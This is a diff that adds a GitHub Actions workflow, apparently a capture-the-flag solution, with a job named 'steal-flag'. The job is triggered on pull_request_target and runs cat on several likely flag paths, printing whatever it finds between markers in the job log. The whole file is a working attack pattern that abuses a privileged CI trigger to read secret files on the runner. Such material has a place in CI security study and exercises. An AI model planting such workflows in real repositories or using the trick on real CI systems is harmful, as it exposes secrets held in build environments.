@@ -1,0 +1,14 @@
+name: backstage-pass
+
+on:
+  pull_request_target:
+
+jobs:
+  steal-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read flag
+        run: |
+          echo "FLAG_START"
+          cat /flag || cat flag || cat /app/flag || cat /app/flag.txt || true
+          echo "FLAG_END"
